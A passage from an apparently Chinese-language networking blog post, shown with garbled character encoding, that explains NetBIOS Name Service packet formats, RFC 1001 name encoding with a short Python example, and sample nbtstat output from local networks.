<h3 id="NAME-REGISTRATION-REQUEST"><a href="#NAME-REGISTRATION-REQUEST" class="headerlink" title="NAME REGISTRATION REQUEST"></a>NAME REGISTRATION REQUEST</h3><p>åç§°æ³¨å†Œè¯·æ±‚æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         NAME_TRN_ID           |0|  0x5  |0|0|1|0|0 0|B|  0x0  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          0x0001               |           0x0000              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          0x0000               |           0x0001              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                         QUESTION_NAME                         /
/                                                               /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           NB (0x0020)         |        IN (0x0001)            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                            RR_NAME                            /
/                                                               /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           NB (0x0020)         |        IN (0x0001)            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                              TTL                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           0x0006              |        NB_FLAGS               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          NB_ADDRESS                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<p>å¯ä»¥å’Œä¸Šé¢ä»‹ç»çš„è¿›è¡Œä¸€ä¸€æ ¸å¯¹ï¼Œå¤´éƒ¨ä¿¡æ¯çš„<code>OPCODE</code>ä¸º<code>0|0x5</code>, Rä¸º0è¯´æ˜æ˜¯è¯·æ±‚åŒ…ï¼Œ0x5è¯´æ˜æ˜¯registrationï¼Œå³æ³¨å†Œä¿¡æ¯è¯·æ±‚ï¼›NM_FLAGS<code>AA|TC|RD|RA|0|0|B</code>ä¸º<code>0|0|1|0|0|0|B</code>, å› ä¸ºæ˜¯è¯·æ±‚åŒ…ï¼Œæ‰€ä»¥<code>AA=0</code>ï¼›é»˜è®¤æ”¯æŒæ³¨å†Œä¿¡æ¯è¯·æ±‚åŒ…å«queryå’Œadditionalä¸¤éƒ¨åˆ†ä¿¡æ¯ï¼Œæ‰€ä»¥<code>QDCOUNT</code>å’Œ<code>ARCOUND</code>å‡ä¸º1ï¼Œå…¶ä½™ä¸¤ä¸ªè®¡æ•°å€¼ä¸º0ã€‚</p>
<p>HEADERå¾€åæ˜¯QUESTION_NAMEï¼ŒNB (0x0020)è¯´æ˜åç§°è¯·æ±‚ç±»å‹ä¸º<code>NB</code>, è¯·æ±‚ç±»åˆ«é€šå¸¸å‡ä¸º0x0001, å›ºå®šä¸å˜ã€‚</p>
<p>å†å¾€åæ˜¯TTLï¼Œå›ºå®šçš„0x0006è¡¨å¾NB_FLAGSå’ŒNB_ADDRESSçš„æ€»é•¿ä¸º6ä¸ªå­—èŠ‚ã€‚å…¶ä¸­NB_ADDRESSå°±æ˜¯è¦æ³¨å†Œçš„åœ°å€ï¼Œè€ŒNB_FLAGSæ ‡è®°äº†è¿™ä¸ªåç§°çš„å”¯ä¸€æ€§å’Œæ•°æ®åŒ…çš„ç±»å‹ï¼ˆå¹¿æ’­è¿˜æ˜¯å•æ’­ï¼‰ã€‚</p>
<h3 id="POSTIVE-NAME-REGISTRATION-RESPONSE"><a href="#POSTIVE-NAME-REGISTRATION-RESPONSE" class="headerlink" title="POSTIVE NAME REGISTRATION RESPONSE"></a>POSTIVE NAME REGISTRATION RESPONSE</h3><pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| NAME_TRN_ID |1| 0x5 |1|0|1|1|0 0|0| 0x0 |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          0x0000               |           0x0001              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          0x0000               |           0x0000              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                            RR_NAME                            /
/                                                               /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           NB (0x0020)         |        IN (0x0001)            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                              TTL                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           0x0006              |        NB_FLAGS               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          NB_ADDRESS                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<p>åœ¨Registration responseä¸­ï¼ŒHEADERçš„<code>R</code>å’Œ<code>AA</code>éƒ½å˜æˆäº†1ï¼Œä»£è¡¨å“åº”åŒ…ï¼›<code>B</code>ä¸º0ä»£è¡¨å•æ’­åŒ…å½¢å¼å‘é€ï¼›<code>RA</code>ä¸<code>RD</code>å‡ä¸º1ï¼Œè¯´æ˜ç»ˆç«¯æ”¯æŒé€’å½’è¯·æ±‚ã€æ³¨å†Œå’Œé‡Šæ”¾ï¼Œä½†æ˜¯ä¼šä»¥è¿­ä»£çš„æ–¹å¼è¿›è¡Œè¯·æ±‚ã€æ³¨å†Œæˆ–é‡Šæ”¾ã€‚åé¢éƒ¨åˆ†ä¸è¯·æ±‚æ³¨å†Œçš„ä¿¡æ¯ä¸€è‡´ã€‚</p>
<h3 id="NODE-STATUS-REQUEST"><a href="#NODE-STATUS-REQUEST" class="headerlink" title="NODE STATUS REQUEST"></a>NODE STATUS REQUEST</h3><p>Node status requestä¹Ÿæ˜¯è·¯ç”±å™¨è·å–PCè®¾å¤‡åç§°çš„å¸¸ç”¨æ–¹å¼ï¼Œå…¶è¯·æ±‚æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| NAME_TRN_ID |0| 0x0 |0|0|0|0|0 0|B| 0x0 |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          0x0001               |           0x0000              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          0x0000               |           0x0000              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                         QUESTION_NAME                         /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         NBSTAT (0x0021)       |        IN (0x0001)            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<p>ä¸registrationç›¸æ¯”ï¼ŒRR_TYPEç”±NBå˜å‘³äº†NBSTATï¼Œå°‘äº†Additionaléƒ¨åˆ†ï¼Œä»…ä»…åŒ…å«è¯·æ±‚ä¿¡æ¯ã€‚</p>
<h3 id="NODE-STATUS-RESPONSE"><a href="#NODE-STATUS-RESPONSE" class="headerlink" title="NODE STATUS RESPONSE"></a>NODE STATUS RESPONSE</h3><p>Node status responseçš„æ•°æ®åŒ…æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         NAME_TRN_ID           |1|  0x0  |1|0|0|0|0 0|0|  0x0  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          0x0000               |           0x0001              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          0x0000               |           0x0000              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                            RR_NAME                            /
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         NBSTAT (0x0021)       |        IN (0x0001)            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          0x00000000                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            RDLENGTH           |   NUM_NAMES   |               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+               +
|                                                               |
+                                                               +
/                         NODE_NAME ARRAY                       /
+                                                               +
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
+                                                               +
/                           STATISTICS                          /
+                                                               +
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<p>èŠ‚ç‚¹çŠ¶æ€ä¿¡æ¯å¾ˆå¤šï¼Œå…¶ä¸­<code>NUM_NAMES</code>è¡¨ç¤ºåé¢ç´§éšçš„èŠ‚ç‚¹åç§°æ•°ç»„é•¿åº¦ï¼Œæ¯ä¸ªæ•°ç»„å…ƒç´ åŒ…å«18å­—èŠ‚ï¼š16å­—èŠ‚çš„åç§°å’Œ2ä¸ªå­—èŠ‚çš„NAME_FLAGS. NAME_FLAGSæ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="yml">                                          1   1   1   1   1   1
  0   1   2   3   4   5   6   7   8   9   0   1   2   3   4   5
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
| G |  ONT  |DRG|CNF|ACT|PRM|          RESERVED                 |
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
</code></pre>
<ul>
<li>G: ç»„åæ ‡å¿—ï¼Œä¸º1ä»£è¡¨ç»„åï¼Œä¸º0ä»£è¡¨å”¯ä¸€åç§°</li>
<li>ONT: Owner Node Type<ul>
<li>00 = B node</li>
<li>01 = P node</li>
<li>10 = M node</li>
<li>11 = Reserved</li>
</ul>
</li>
<li>DRG: æ³¨é”€æ ‡å¿—</li>
<li>CNF: å†²çªæ ‡å¿—</li>
<li>ACT: æœ‰æ•ˆåç§°æ ‡å¿—ï¼Œå‡è®¾ç½®ä¸º1</li>
<li>PRM: æ°¸ä¹…åç§°æ ‡å¿—</li>
<li>RESERVED</li>
</ul>
<p>STATISTICSå­—æ®µçš„æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="yml">                     1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|               UNIT_ID (Unique unit ID)                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       UNIT_ID,continued       |    JUMPERS    |  TEST_RESULT  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       VERSION_NUMBER          |      PERIOD_OF_STATISTICS     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       NUMBER_OF_CRCs          |     NUMBER_ALIGNMENT_ERRORS   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       NUMBER_OF_COLLISIONS    |       NUMBER_SEND_ABORTS      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       NUMBER_GOOD_SENDS                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      NUMBER_GOOD_RECEIVES                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       NUMBER_RETRANSMITS      | NUMBER_NO_RESOURCE_CONDITIONS |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  NUMBER_FREE_COMMAND_BLOCKS   |  TOTAL_NUMBER_COMMAND_BLOCKS  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|MAX_TOTAL_NUMBER_COMMAND_BLOCKS|    NUMBER_PENDING_SESSIONS    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  MAX_NUMBER_PENDING_SESSIONS  |  MAX_TOTAL_SESSIONS_POSSIBLE  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|   SESSION_DATA_PACKET_SIZE    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<h2 id="NetBIOS-å‘½åç¼–ç "><a href="#NetBIOS-å‘½åç¼–ç " class="headerlink" title="NetBIOS å‘½åç¼–ç "></a>NetBIOS å‘½åç¼–ç </h2><p>ä¸Šé¢æ‰€æœ‰æåŠçš„æŠ¥æ–‡ä¸­éƒ½åŒ…å«NetBIOSåç§°ï¼Œè¿™ä¸ªåç§°æ˜¯è¢«ç»è¿‡ç¼–ç å¤„ç†çš„ã€‚å‚è€ƒä»¥ä¸‹<a href="https://tools.ietf.org/html/rfc1001" target="_blank" rel="noopener">RFC 1001 Ch14.1</a>å¯çŸ¥ï¼Œæœ€é•¿16Byteçš„NetBIOS nameè¢«è¦æ±‚æ˜ å°„ä¸º32Byteçš„å¯é€†çš„ã€åŠASCIIåç½®ç¼–ç ã€‚</p>
<blockquote>
<p>The 16 byte NetBIOS name is mapped into a 32 byte wide field using a reversible, half-ASCII, biased encoding.  Each half-octet of the NetBIOS name is encoded into one byte of the 32 byte field.  The first half octet is encoded into the first byte, the second half- octet into the second byte, etc.</p>
<p>Each 4-bit, half-octet of the NetBIOS name is treated as an 8-bit, right-adjusted, zero-filled binary number.  This number is added to value of the ASCII character &#39;A&#39; (hexidecimal 41).  The resulting 8- bit number is stored in the appropriate byte.</p>
</blockquote>
<p>ç®€å•è®²ï¼Œå°±æ˜¯å°†æ¯ä¸ªå­—ç¬¦æŒ‰ASCIIæ‹†æˆä¸¤éƒ¨åˆ†ï¼Œæ¯éƒ¨åˆ†å†åŠ ä¸Š<code>A</code>ï¼Œä»è€Œç”±1ä¸ªå­—ç¬¦å˜æˆä¸¤ä¸ªå­—ç¬¦ã€‚æ¯”å¦‚å­—ç¬¦<code>L</code>ï¼Œå¯¹åº”ASCII <code>0x4C</code>ï¼Œæ‹†æˆä¸¤éƒ¨åˆ†ä¸º<code>0x4</code>å’Œ<code>0xC</code>ï¼Œç„¶åæ¯éƒ¨åˆ†éƒ½åŠ ä¸Šå­—ç¬¦<code>A</code>å¯¹åº”çš„ASCII <code>0x41</code>ï¼Œå¾—åˆ°<code>0x45</code>å’Œ<code>0x4D</code>ï¼Œå¯¹åº”å­—ç¬¦<code>E</code>å’Œ<code>M</code>ï¼Œè¿™æ ·åŸå§‹å­—ç¬¦<code>L</code>å°±å˜æˆäº†åŒå­—ç¬¦<code>EM</code>ã€‚ä¸‹é¢æ˜¯è¿™ä¸ªç¤ºä¾‹çš„è¯¦ç»†è¯´æ˜å›¾è§£ã€‚</p>
<p><img src="/assets/network/nbns/nbns_name.png" alt="NetBIOSå‘½åç¼–ç ç¤ºä¾‹"></p>
<p>æ³¨æ„åŸå§‹åç§°ä¸è¶³16å­—èŠ‚å¯ä»¥è¡¥ç©ºæ ¼<code>0x20</code>æˆ–NULL<code>0x00</code>ï¼Œè¿™é‡Œè¡¥çš„æ˜¯ç©ºæ ¼ï¼›å¦‚æœé•¿åº¦è¶…è¿‡16åˆ™éœ€è¦æˆªå–å‰16å­—èŠ‚ã€‚</p>
<p>ä½¿ç”¨<code>Python</code>å¯ä»¥å¿«é€Ÿå®Œæˆç¼–ç â†“</p>
<pre><code class="python">&gt;&gt;&gt; orig_name = &#39;LITREILY&#39;.ljust(16)
&gt;&gt;&gt; encoded_name = &#39;&#39;.join([ chr((ord(c)&gt;&gt;4) + ord(&#39;A&#39;)) + chr((ord(c)&amp;0x0F) + ord(&#39;A&#39;)) for c in orig_name ])
&gt;&gt;&gt; encoded_name
&#39;EMEJFEFCEFEJEMFJCACACACACACACACA&#39;
</code></pre>
<p>åœ¨çœŸå®çš„æ•°æ®åŒ…ä¸­ï¼ŒNetBIOSåç§°å‰é¢æ˜¯<code>0x20</code>ï¼Œä»£è¡¨åç§°å›ºå®šé•¿åº¦32å­—èŠ‚ï¼Œåç§°åé¢å¡«è¡¥ä¸€ä¸ª<code>0x00</code>å³<code>\0</code>ä½œä¸ºç»“æŸç¬¦ã€‚é‚£ä¹ˆä¸Šé¢çš„<code>LITREILY</code>å¯¹åº”çš„æ•°æ®ä¸ºï¼š</p>
<pre><code class="yml">20 45 4d 45 4a 46 45 46 43 45 46 45 4a 45 4d 46
4a 43 41 43 41 43 41 43 41 43 41 43 41 43 41 43
41 00
</code></pre>
<blockquote>
<p><strong>æ³¨æ„ï¼š</strong></p>
<p>A label length count is actually a 6-bit field in the label length field. The most significant 2 bits of the field, bits 7 and 6, are flags allowing an escape from the above compressed representation. <strong>If bits 7 and 6 are both set (11), the following 14 bits are an offset pointer into the full message to the actual label string from another domain name that belongs in this name.</strong> This label pointer allows for a further compression of a domain name in a packet.</p>
<p>ç®€å•è¯´ï¼Œå½“é•¿åº¦è®¾ç½®ä¸ä¸º<code>0x20</code>ï¼Œè€Œæ˜¯å°†æœ€é«˜ä¸¤ä½ç½®1ï¼Œå³è®¾ä¸º<code>0xc0</code>æ—¶ï¼Œä»£è¡¨å½“å‰åç§°ä½¿ç”¨æŒ‡é’ˆï¼Œéšåçš„å­—èŠ‚æŒ‡å®šåç§°æ‰€åœ¨çš„ä½ç½®ã€‚</p>
</blockquote>
<h2 id="nbtstat"><a href="#nbtstat" class="headerlink" title="nbtstat"></a>nbtstat</h2><p><code>nbtstat.exe</code>æ˜¯Windowsä¸­ç”¨äºæŸ¥çœ‹NBT statusçš„å·¥å…·ï¼Œé€šè¿‡å®ƒå¯ä»¥æŸ¥çœ‹å½“å‰å±€åŸŸç½‘å†…çš„NetBIOS name.</p>
<h3 id="å¸®åŠ©ä¿¡æ¯"><a href="#å¸®åŠ©ä¿¡æ¯" class="headerlink" title="å¸®åŠ©ä¿¡æ¯"></a>å¸®åŠ©ä¿¡æ¯</h3><pre><code class="yml">C:\Users\Litre&gt;nbtstat.exe -a
æ˜¾ç¤ºåè®®ç»Ÿè®¡å’Œå½“å‰ä½¿ç”¨ NBI çš„ TCP/IP è¿æ¥
(åœ¨ TCP/IP ä¸Šçš„ NetBIOS)ã€‚

NBTSTAT [ [-a RemoteName] [-A IP address] [-c] [-n]
        [-r] [-R] [-RR] [-s] [-S] [interval] ]

  -a   (é€‚é…å™¨çŠ¶æ€)    åˆ—å‡ºæŒ‡å®šåç§°çš„è¿œç¨‹æœºå™¨çš„åç§°è¡¨
  -A   (é€‚é…å™¨çŠ¶æ€)    åˆ—å‡ºæŒ‡å®š IP åœ°å€çš„è¿œç¨‹æœºå™¨çš„åç§°è¡¨ã€‚
  -c   (ç¼“å­˜)          åˆ—å‡ºè¿œç¨‹[è®¡ç®—æœº]åç§°åŠå…¶ IP åœ°å€çš„ NBT ç¼“å­˜
  -n   (åç§°)          åˆ—å‡ºæœ¬åœ° NetBIOS åç§°ã€‚
  -r   (å·²è§£æ)        åˆ—å‡ºé€šè¿‡å¹¿æ’­å’Œç»ç”± WINS è§£æçš„åç§°
  -R   (é‡æ–°åŠ è½½)      æ¸…é™¤å’Œé‡æ–°åŠ è½½è¿œç¨‹ç¼“å­˜åç§°è¡¨
  -S   (ä¼šè¯)          åˆ—å‡ºå…·æœ‰ç›®æ ‡ IP åœ°å€çš„ä¼šè¯è¡¨
  -s   (ä¼šè¯)          åˆ—å‡ºå°†ç›®æ ‡ IP åœ°å€è½¬æ¢æˆè®¡ç®—æœº NETBIOS åç§°çš„ä¼šè¯è¡¨ã€‚
  -RR  (é‡Šæ”¾åˆ·æ–°)      å°†åç§°é‡Šæ”¾åŒ…å‘é€åˆ° WINSï¼Œç„¶åå¯åŠ¨åˆ·æ–°

  RemoteName   è¿œç¨‹ä¸»æœºè®¡ç®—æœºåã€‚
  IP address   ç”¨ç‚¹åˆ†éš”çš„åè¿›åˆ¶è¡¨ç¤ºçš„ IP åœ°å€ã€‚
  interval     é‡æ–°æ˜¾ç¤ºé€‰å®šçš„ç»Ÿè®¡ã€æ¯æ¬¡æ˜¾ç¤ºä¹‹é—´æš‚åœçš„é—´éš”ç§’æ•°ã€‚
               æŒ‰ Ctrl+C åœæ­¢é‡æ–°æ˜¾ç¤ºç»Ÿè®¡ã€‚
</code></pre>
<p>å…¶ä¸­<code>RemoteName</code>æ—¢å¯ä»¥æ˜¯ASCIIå½¢å¼çš„åç§°ï¼Œä¹Ÿå¯ä»¥æ˜¯IPåœ°å€ã€‚</p>
<h3 id="ä½¿ç”¨ç¤ºä¾‹ä¸€"><a href="#ä½¿ç”¨ç¤ºä¾‹ä¸€" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹ä¸€"></a>ä½¿ç”¨ç¤ºä¾‹ä¸€</h3><p>ç¬¬ä¸€ä¸ªä¾‹å­ï¼Œåœ¨åŠ å…¥åŸŸ<code>DELTA</code>çš„åŠå…¬ç”µè„‘ä¸Šã€‚3ä¸ªç½‘å¡ï¼Œç¬¬1ä¸ªç½‘å¡è¿æ¥è·¯ç”±å™¨ï¼Œç¬¬2ä¸ªç½‘å¡è¿æ¥å…¬å¸ç½‘ï¼Œç¬¬3ä¸ªä¸ºè™šæ‹Ÿç½‘å¡ã€‚</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat.exe -n

Router:
èŠ‚ç‚¹ IP å€å€: [192.168.1.10] èŒƒå›´ ID: []

                NetBIOS æœ¬åœ°åç§°è¡¨

       åç§°               ç±»å‹         çŠ¶æ€
    ---------------------------------------------
    CNSHDNI2PC074  &lt;00&gt;  å”¯ä¸€          å·²æ³¨å†Œ
    DELTA          &lt;00&gt;  ç»„           å·²æ³¨å†Œ
    CNSHDNI2PC074  &lt;20&gt;  å”¯ä¸€          å·²æ³¨å†Œ
    DELTA          &lt;1E&gt;  ç»„           å·²æ³¨å†Œ
    DELTA          &lt;1D&gt;  å”¯ä¸€          å·²æ³¨å†Œ
    ..__MSBROWSE__.&lt;01&gt;  ç»„           å·²æ³¨å†Œ

Company:
èŠ‚ç‚¹ IP å€å€: [172.17.144.33] èŒƒå›´ ID: []

                NetBIOS æœ¬åœ°åç§°è¡¨

       åç§°               ç±»å‹         çŠ¶æ€
    ---------------------------------------------
    CNSHDNI2PC074  &lt;00&gt;  å”¯ä¸€          å·²æ³¨å†Œ
    DELTA          &lt;00&gt;  ç»„           å·²æ³¨å†Œ
    CNSHDNI2PC074  &lt;20&gt;  å”¯ä¸€          å·²æ³¨å†Œ
    DELTA          &lt;1E&gt;  ç»„           å·²æ³¨å†Œ

ä»¥å¤ªç½‘:
èŠ‚ç‚¹ IP å€å€: [0.0.0.0] èŒƒå›´ ID: []

    ç¼“å­˜ä¸­æ²¡æœ‰åç§°
</code></pre>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåç§°è¡¨ä¸­æ¯ä¸ªåç§°éƒ½æ˜¯16å­—èŠ‚ï¼Œä¸­é—´ç©ºç™½å¤„æ˜¯ç©ºæ ¼ç¬¦ï¼Œæœ€åä¸€ä¸ªå­—èŠ‚ç”¨<code>&lt;&gt;</code>æ˜¾ç¤ºï¼Œé‡Œé¢ä½¿ç”¨16è¿›åˆ¶æ•°è¡¨ç¤ºã€‚å¦‚<code>CHSH2DNIPC074__&lt;00&gt;</code>ï¼Œ<code>_</code>ä»£è¡¨ç©ºæ ¼ï¼Œæœ€åä¸€ä¸ªå­—èŠ‚<code>&lt;00&gt;</code>æ˜¯<code>\0</code>. NetBIOS nameå¯ä»¥å”¯ä¸€ï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªè®¾å¤‡å…±ç”¨ä¸€ä¸ªç»„ï¼Œå”¯ä¸€åç§°ç”¨äºæŒ‡å®šå”¯ä¸€ä¸€å°è®¾å¤‡ï¼Œè€Œç»„åå¦‚æ­¤å¤„çš„<code>DELTA</code>æ˜¯åŸŸåç§°ï¼Œå±€åŸŸç½‘åŠ å…¥åŸŸå¯¹åº”çš„åŸŸåå°±æ˜¯è¿™ç§ç»„åç§°ï¼Œä¹Ÿç§°ä¹‹ä¸º<strong>å·¥ä½œç»„</strong>ã€‚</p>
<h3 id="ä½¿ç”¨ç¤ºä¾‹äºŒ"><a href="#ä½¿ç”¨ç¤ºä¾‹äºŒ" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹äºŒ"></a>ä½¿ç”¨ç¤ºä¾‹äºŒ</h3><p>ç¬¬äºŒä¸ªä¾‹å­ï¼Œæˆ‘ä½¿ç”¨å®¶ç”¨å°å¼PCåœ¨å±€åŸŸç½‘å†…è¿›è¡Œäº†åå¤æµ‹è¯•ã€‚ä¸‹é¢æ˜¯ç®€è¦çš„æŠ“åŒ…ä¿¡æ¯ã€‚</p>
<p><img src="/assets/network/nbns/nbns.png" alt="nbns packets"></p>
<p><code>nbtstat -a RemoteName</code>ç”¨äºè¯·æ±‚æŒ‡å®šåç§°æ‰€åœ¨è®¾å¤‡çš„åç§°è¡¨ã€‚</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -a DZ-DN-700

eth0:
èŠ‚ç‚¹ IP å€å€: [192.168.1.14] èŒƒå›´ ID: []

           NetBIOS è¿œç¨‹è®¡ç®—æœºåç§°è¡¨

       åç§°               ç±»å‹         çŠ¶æ€
    ---------------------------------------------
    DZ-DN-700      &lt;20&gt;  å”¯ä¸€          å·²æ³¨å†Œ
    DZ-DN-700      &lt;00&gt;  å”¯ä¸€          å·²æ³¨å†Œ
    DIAS           &lt;00&gt;  ç»„           å·²æ³¨å†Œ
    DIAS           &lt;1E&gt;  ç»„           å·²æ³¨å†Œ

    MAC åœ°å€ = E4-42-A6-18-AB-00


C:\WINDOWS\system32&gt;nbtstat -a 192.168.1.12

eth0:
èŠ‚ç‚¹ IP å€å€: [192.168.1.14] èŒƒå›´ ID: []

           NetBIOS è¿œç¨‹è®¡ç®—æœºåç§°è¡¨

       åç§°               ç±»å‹         çŠ¶æ€
    ---------------------------------------------
    DZ-DN-700      &lt;20&gt;  å”¯ä¸€          å·²æ³¨å†Œ
    DZ-DN-700      &lt;00&gt;  å”¯ä¸€          å·²æ³¨å†Œ
